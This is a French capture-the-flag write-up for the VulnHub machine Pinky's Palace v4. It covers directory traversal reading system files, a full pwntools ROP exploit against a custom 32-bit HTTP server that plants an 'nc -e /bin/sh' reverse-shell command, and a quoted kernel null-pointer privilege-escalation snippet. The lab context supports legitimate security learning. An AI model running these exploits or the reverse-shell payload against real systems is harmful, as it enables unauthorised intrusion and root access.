---
title: "Solution du CTF Pinky's Palace v4 de VulnHub"
tags: [CTF, VulnHub, binary exploitation]
---

[Pinky's Palace: v4](https://vulnhub.com/entry/pinkys-palace-v4,265/) s'annonçait comme difficile en bon successeur des précédents opus. Une fois de plus on va vite rentrer dans de l'exploitation de binaire après quelques intuitions lors de l'énumération.

Pour l'escalade de privilèges il me manquait quelques connaissances pour comprendre ce qui était attendu et j'ai préféré donner ma langue au chat.

## Finalement c'était le colonel Moutarde le coupable !

Le port 80 nous fournit l'output d'un `phpinfo()`. Il n'y a pas grande information à en tirer si ce n'est que la machine est en 32bits.

J'ai énuméré en long et en large sans rien trouver d'autres sur ce serveur.

Je suis donc passé à l'autre serveur web sur le port 65535. Ce dernier supportant mal les énumérations, même à petite dose, je me suis dit qu'il fallait mieux y jeter un œil manuellement.

Déjà le fait que le serveur réponde en `HTTP/1.0` (quand l'entête `Host` n'existait pas) est un signe probable que l'on a affaire à un code fait maison.

La vulnérabilité classique sur un serveur web exotique, c'est le directory traversal et ce dernier n'échappe pas à la règle :

```console
$ echo -e "GET /../../../../../../../../../../etc/passwd HTTP/1.0\r\n\r\n" | ncat 192.168.56.187 65535 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.187:65535.
HTTP/1.0 200 OK
Server: pinkys-HTTP-server

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
pinky:x:1337:1337::/home/pinky:/bin/bash
phs:x:1338:1338::/srv/phs:/usr/sbin/nologin
Ncat: 59 bytes sent, 1464 bytes received in 0.08 seconds.
```

J'ai tenté en vain de trouver une clé SSH pour les utilisateurs. En revanche j'ai aussi obtenu plus de détails sur la VM :

```console
$ echo -e "GET /../../etc/os-release HTTP/1.0\r\n\r\n" | ncat 192.168.56.187 65535 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.187:65535.
HTTP/1.0 200 OK
Server: pinkys-HTTP-server

PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
Ncat: 39 bytes sent, 283 bytes received in 0.09 seconds.
```

J'ai aussi remarqué un comportement permettant de vérifier la présence de dossiers. Ainsi si on demande `/etc/` on obtient une erreur `404` mais `/etc` (sans slash terminal) retourne un code `200` :

```console
$ echo -e "GET /../../etc/ HTTP/1.0\r\n\r\n" | ncat 192.168.56.187 65535 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.187:65535.
HTTP/1.0 404 NOT FOUND
Server: pinkys-HTTP-server

<html><head><title>404 Not Found</title></head><body><h1>File Not Found</h1></body></html>
Ncat: 29 bytes sent, 146 bytes received in 0.09 seconds.
$ echo -e "GET /../../etc HTTP/1.0\r\n\r\n" | ncat 192.168.56.187 65535 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.187:65535.
HTTP/1.0 200 OK
Server: pinkys-HTTP-server

Ncat: 28 bytes sent, 4143 bytes received in 0.09 seconds.
```

J'ai continué de jouer un peu avec le serveur et il semble qu'il soit possible de le faire crasher en lui envoyant une requête un peu longue (par exemple avec un path de 1024 octets).

Le serveur s'identifie via son entête comme `pinkys-HTTP-server` et c'est justement en demandant un fichier du même nom que j'ai pu obtenir le binaire correspondant au serveur.

Comme je l'ai récupéré via `Ncat` il me restait à retirer les entêtes HTTP, chose que j'ai fait avec la commande `dd` :

```bash
dd if=pinkys-HTTP-server bs=1 skip=47 of=/tmp/server
```

## Si je ne suis pas de retour dans 5 minutes... Attendez plus longtemps !

L'exécutable en question est (bien sûr) un 32 bits et utilise les librairies du système. `NX` est actif, mais la pile n'est pas protégée par des canary.

```console
$ file server 
server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=74b82688f1a7fe82a9f460741572bd29b9d10eaa, stripped
$ checksec --file server 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   server
```

La pile est-elle randomisée ? Malheureusement le serveur ne semble pas capable de retourner le contenu de `/proc/sys/kernel/randomize_va_space` ni de `/proc/self/maps`, ce qui nous aurait bien aidé.

Je n'entrerais pas en détails dans l'analyse du binaire, mais la fonction `main` commence par faire un `setuid` / `setid` / `seteuid` / `setegid` pour l'utilisateur `1338`.

Il passe ensuite sur les appels classiques à s'avoir `bind` / `listen` / `accept` / `fork` avant d'appeler la fonction à l'adresse `0x8048aad` qui prend pour paramètre le socket client.

C'est cette fonction qui est exploitable (on écrase `eip` au moment du `ret` de la fonction) mais elle a quelques points particuliers.

Tout d'abord elle appelle une fonction à l'adresse `0x080489c0` qui se charge de lire les données. Celle-ci lit octet par octet via `recv` et s'arrête dès qu'elle voit un retour à la ligne. L'autre point important, c'est que quand elle rencontre un octet nul elle affiche un warning et le remplace par le caractère `P`.

Au retour, la présence des chaines `HTTP/` ainsi que `GET ` ou `HEAD ` est vérifiée et si tout est ok alors un path est généré en concaténant `./` au path reçu.

Un test local m'a montré qu'en envoyant `GET A*1024 HTTP/` (avec 1024 `A`) alors les 4 derniers `A` viennent écraser l'adresse de retour (offset 1024).

Pour résumer la situation :

- NX est actif donc on ne peut pas placer un shellcode, il faut du ret2libc ou ROP

- le binaire utilise des sockets donc faire un ret2libc pour exécuter `/bin/sh` n'a aucun sens (on ne contrôle ni l'input ni l'output)

- on ne sait pas si l'ASLR est activée ou non

- on ne peut pas passer des octets nuls ce qui est compliqué pour faire fuiter une adresse de la libc car le descripteur de socket sera un petit chiffre (4)

## Tu la sens ma grosse intelligence !

L'idée d'exploitation que j'ai retenue est similaire à celle utilisée pour d'autres CTFs à savoir obtenir l'adresse d'une fonction de la libc (exemple : `puts`) et y ajouter le décalage nécessaire pour obtenir celle de `system` MAIS ici on ne va pas communiquer avec l'appli pour récupérer l'adresse fuitée : on va se servir d'un gadget (instruction déjà présente dans l'application) pour corriger l'adresse directement dans la mémoire du programme.

Pour commencer, il nous faut récupérer la libc du système. Avec les informations sur l'OS que j'ai récupéré plus tôt je peux retrouver le path de la libc :

[Debian -- Résultat de la recherche du contenu du paquet -- libc.so.6](https://packages.debian.org/search?suite=stretch&arch=i386&mode=filename&searchon=contents&keywords=libc.so.6)

Je peux alors récupérer la libc auprès du serveur web en lui demandant le fichier `/lib/i386-linux-gnu/libc.so.6`.

La commande `nm` me permet de voir les offsets des deux fonctions :

```console
$ nm -D libc.so | grep -e "puts\|system"
0005e2a0 W fputs
00068230 W fputs_unlocked
0005e2a0 T _IO_fputs
0005f880 T _IO_puts
0003ab40 T __libc_system
0005f880 W puts
000edb90 T putsgent
000ec450 T putspent
00113d70 T svcerr_systemerr
0003ab40 W system
```

Une fois chargé en mémoire, les décalages entre les deux fonctions sont préservées. Comme l'adresse de `puts` sera stockée à une adresse fixe dans la `GOT`, il me suffit de rajouter à cette adresse le décalage nécessaire et faire ainsi en sorte qu'un appel à `puts` appel en réalité `system`.

Pour faire cette opération j'ai besoin d'un gadget dans le binaire et pour être franc, il n'y a pas grand choix :

```nasm
0x08048dd7 : add dword ptr [eax + 0x5bf8658d], edx ; pop edi ; pop ebp ; ret
```

Il faut donc faire des calculs plutôt simples, mais assez contraignant.

Supposons qu'on veuille écrire à l'adresse `0x0804b03c`. Il faut donc que `eax` corresponde à la valeur `0x0804b03c - 0x5bf8658d`. On ne peut pas le faire directement en Python, car on obtient un résultat négatif, mais c'est possible avec le module `ctypes` :

```python
>>> hex(ctypes.c_uint32(0x0804b03c - 0x5bf8658d).value)
'0xac0c4aaf'
```

Les résultats négatifs sont une aubaine dans notre cas, car on ne peut pas passer des octets nuls (donc il faut des valeurs non signées fortes).

Il nous faut aussi un ou plusieurs gadgets pour définir les registres utilisés dans l'addition. J'en trouve deux qui correspondent :

```nasm
0x08048e13 : pop edx ; ret
0x08048e20 : pop eax ; ret
```

Avec tout ça on peut écraser l'adresse de `puts` car on a :

- l'adresse où est stockée l'adresse de `puts` de la libc (`GOT`)

- le décalage entre `puts` et `system`

- l'instruction pour l'addition

- les instructions pour définir les registres nécessaires

Étape suivante : écrire en mémoire la ligne de commande que l'on souhaite, car comme dis plus tôt on ne peut pas faire exécuter un simple `/bin/sh`.

On pourrait écrire à une adresse quelconque du moment que la zone mémoire est écrivable, seulement notre gadget n'est utile que si l'emplacement est remplis d'octets nuls.

Une technique souvent utilisée dans les CTF est d'utiliser la section [bss](https://en.wikipedia.org/wiki/.bss) qui contient les données non initialisées. J'ai jeté un œil et il y avait suffisamment d'octets nuls.

Voici l'exploit final qui utilise `pwntools` :

```python
import sys
import ctypes
from math import ceil

from pwn import ELF, process, ROP, log, p32, u32, remote

BINARY = "/tmp/server"
if sys.argv[1] == "local":
    LIBC = ELF("/lib/libc.so.6")
    TARGET = "127.0.0.1"
else:
    LIBC = ELF("/tmp/libc.so")
    TARGET = "192.168.56.187"

# Gadgets from server binary
pop_edx = 0x08048e13  # pop edx ; ret
pop_eax = 0x08048e20  # pop eax ; ret
write_mem = 0x08048dd7  # add dword ptr [eax + 0x5bf8658d], edx ; pop edi ; pop ebp ; ret
placeholder = 0xdeadbeef

def wrap(s, w):
    return [s[i:i + w] for i in range(0, len(s), w)]

def write_to(what, where):
    chain = p32(pop_edx)
    chain += p32(what)         # edx
    chain += p32(pop_eax)
    chain += p32(ctypes.c_uint32(where - 0x5bf8658d).value)  # eax
    # Beware: we can just add to that address but not overwrite.
    chain += p32(write_mem)
    chain += p32(placeholder)  # edi
    chain += p32(placeholder)  # ebp
    return chain

def write_command(command):
    payload = b""
    count = ceil(len(command) / 4) * 4
    command = command.ljust(count, " ")
    for i, part in enumerate(wrap(command, 4)):
        payload += write_to(u32(part.encode()), BSS+i*4)
    return payload

ELF_LOADED = ELF(BINARY)  # Extract data from binary
BSS = ELF_LOADED.bss()
log.info(f"BSS address is at {hex(BSS)}")

PUTS_PLT = ELF_LOADED.plt['puts']
EXIT_PLT = ELF_LOADED.plt['exit']
PUTS_GOT = ELF_LOADED.got['puts']
log.info("puts plt: " + hex(PUTS_PLT))
log.info("puts got: " + hex(PUTS_GOT))

puts_offset = LIBC.symbols["puts"]
system_offset = LIBC.symbols["system"]
log.info(f"puts offset in libc: {hex(puts_offset)}")
log.info(f"system offset in libc: {hex(system_offset)}")

puts2system = ctypes.c_uint32(system_offset - puts_offset).value
log.info(f"puts to system requires adding {hex(puts2system)} to memory address")

payload = b"GET HTTP/" + b"A" * (1020-5)
payload += write_command("nc -e /bin/sh 192.168.56.1 80")

payload += write_to(puts2system, PUTS_GOT)
payload += p32(PUTS_PLT)
payload += p32(EXIT_PLT)
payload += p32(BSS)

payload += b"\r\n"
r = remote(TARGET, 65535)
r.send(payload)
r.close()
```

J'ai écrit une fonction `write_to` qui construit la ROP chain permettant d'écrire un DWORD donné à l'adresse choisie puis une fonction de plus haut niveau `write_command` qui découpe une ligne de commande en morceaux de 4 octets et les écrits les uns après les autres dans le `bss`.

Une fois que `puts` est écrasé et notre commande placée en mémoire on utilise juste la pile pour faire un `puts(commande)` (donc `system(commande)`).

```console
$ python exploit.py remote
[*] '/tmp/libc.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/tmp/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] BSS address is at 0x804b08c
[*] puts plt: 0x8048730
[*] puts got: 0x804b03c
[*] puts offset in libc: 0x5f880
[*] system offset in libc: 0x3ab40
[*] puts to system requires adding 0xfffdb2c0 to memory address
[+] Opening connection to 192.168.56.187 on port 65535: Done
[*] Closed connection to 192.168.56.187 port 65535
```

Concernant les ports, on n'a pas trop de choix : une règle de parefeu ne permet que les connexions sortantes sur le port 80, ce qui m'a valu quelques échecs d'exploitation.

```console
$ sudo ncat -l -p 80 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.56.187.
Ncat: Connection from 192.168.56.187:37678.
id
uid=1338(phs) gid=1338(phs) groups=1338(phs)
```

On ne peut pas faire grand-chose avec cet utilisateur qui n'a pas de permission sur son home (`/srv/phs`).

## Bonsoir, j’ai besoin de voir Ray Finkle... Et maintenant, j’ai besoin de changer de caleçon.

Une énumération avec `LinPEAS` ou `pspy32` ne remonte rien d'anormal... On trouve juste des fichiers laissant supposer que le kernel a été compilé ou qu'un module a été mis en place.

Avec `lsmod` on trouve un module nommé `pqwd` :

```
pqwd                   16384  0
```

On retrouve le fichier à l'emplacement `/lib/modules/4.9.110/pqwd/pqwd.ko`.

Le module exporte 3 fonctions : `pqinit`, `pqexit` et `qwrite`.

La fonction `pqinit` appelle `proc_create` qui permet de créer sous `/proc` un fichier qui sert à la communication (voir [linux device driver - proc_create() example for kernel module - Stack Overflow](https://stackoverflow.com/a/18924359)).

On retrouve le fichier :

```console
phs@Pinkys-Palace:/tmp$ ls /proc/pqwritedev -al
-rw-rw--w- 1 root root 0 Apr 25 14:47 /proc/pqwritedev
```

Pour la suite je n'ai pas vraiment compris la fonction `qwrite` :

```nasm
qwrite ();
0x08000060      push    ebp        ; RELOC TARGET 32 .text @ 0x08000060 ; [02] -r-x section size 115 named .text
0x08000061      mov     ebp, esp
0x08000063      push    ebx
0x08000064      call    mcount     ; RELOC 32 mcount
0x08000069      mov     eax, dword devfunc ; 0x8000540; RELOC 32 devfunc @ 0x08000540
0x0800006e      mov     ebx, ecx
0x08000070      call    __x86_indirect_thunk_eax; RELOC 32 __x86_indirect_thunk_eax
0x08000075      mov     eax, ebx
0x08000077      pop     ebx
0x08000078      pop     ebp
0x08000079      ret
```

GDB nous donne ceci, ce qui n'est pas forcément plus parlant :

```nasm
gdb-peda$ disass qwrite
Dump of assembler code for function qwrite:
   0x00000030 <+0>:     push   ebp
   0x00000031 <+1>:     mov    ebp,esp
   0x00000033 <+3>:     push   ebx
   0x00000034 <+4>:     call   0x35 <qwrite+5>
   0x00000039 <+9>:     mov    eax,ds:0x0
   0x0000003e <+14>:    mov    ebx,ecx
   0x00000040 <+16>:    call   0x41 <qwrite+17>
   0x00000045 <+21>:    mov    eax,ebx
   0x00000047 <+23>:    pop    ebx
   0x00000048 <+24>:    pop    ebp
   0x00000049 <+25>:    ret    
End of assembler dump.
```

Après avoir lu [Pinky’s Palace V4 Writeup by Lijnk](https://medium.com/@lijnk/pinkys-palace-v4-writeup-1cef1dab06ff) il semble que le module saute sur l'adresse mémoire 0 et exécute les instructions qui s'y trouvent.

Les instructions à passer pour devenir root correspondent à `prepare_kernel_cred(commit_creds(0))`. Obtenir l'adresse des fonctions se fait en lisant `/proc/kallsyms`.

Il faut aussi faire en sorte de sortir proprement de la fonction pour ne pas causer un kernel panic.

Sur le Github de l'auteur du CTF on trouve [une solution officielle](https://github.com/PinkP4nther/Pinkys-Palacev4-PoCs/blob/master/pqwd_ex.c) qui consiste à mapper la mémoire à l'adresse 0, y placer le code assembleur puis écrire sur `/proc/pqwritedev` :

```c
	printf("[+] Mapping 1 page (4KB) of memory @ 0x00000000\n");
	mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	
	printf("[+] Writing payload to allocated page @ 0x00000000\n");
	memcpy(0,pay,sizeof(pay));
	
	printf("[+] Opening target proc entry\n");
	int fd=open("/proc/pqwritedev",O_WRONLY);
	
	printf("[+] Writing to vulnerable driver\n");
	write(fd,"foo",3);
```

Même si je n'ai pas eu cette partie, l'exploitation du binaire était intéressante :)
